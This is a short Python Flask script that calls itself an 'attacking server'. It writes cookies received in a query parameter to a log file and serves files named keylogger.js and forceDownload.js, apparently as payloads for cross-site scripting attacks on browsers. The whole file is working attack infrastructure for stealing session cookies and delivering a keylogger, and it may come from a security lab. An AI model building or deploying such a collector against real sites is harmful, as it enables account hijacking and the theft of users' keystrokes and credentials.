from flask import Flask, request, redirect, send_file

app = Flask(__name__)

@app.route('/')
def index():
    cookie = request.args.get('c')
    f = open("logs.txt","a")
    f.write(cookie+'\n')
    f.close()
    return "This is attacking server"
    


@app.route('/getkeylogger', methods=['GET'])
def send_keylogger():
   return send_file("keylogger.js")
   
@app.route('/forcedownload', methods=['GET'])
def send_forcedownload():
   return send_file("forceDownload.js")   
   
app.run(host='0.0.0.0', port=5000)
